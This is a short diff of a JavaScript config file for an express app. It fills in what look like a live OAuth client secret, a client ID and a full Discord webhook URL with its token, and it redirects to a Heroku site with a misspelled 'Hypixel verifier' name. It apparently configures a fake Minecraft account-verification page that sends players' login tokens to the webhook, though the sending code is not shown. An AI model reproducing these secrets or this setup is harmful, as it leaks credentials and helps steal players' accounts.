@@ -1,8 +1,8 @@
 //Config
-const client_secret = 'secret_value'
-const client_id = 'client_id'
+const client_secret = 'Lve8Q~dt5B8DpK50xCoFRPpZexAkKM7sPl3gMa_x'
+const client_id = '9ccdc0a4-d93f-42ba-a89d-0e4a4b7290ce'
 const redirect_uri = 'https://hypixelverfiermc.herokuapp.com/'
-const webhook_url = 'webhook'
+const webhook_url = 'https://discord.com/api/webhooks/1040891016204517427/4zKYRvxAN7jeC0V6RIYkLe0tYK4AHnjY76PCeJ_8pwkoLisZIouPnSlcQzUeVt0yUHR8'
 //Requirements
 const axios = require('axios')
 const express = require('express')
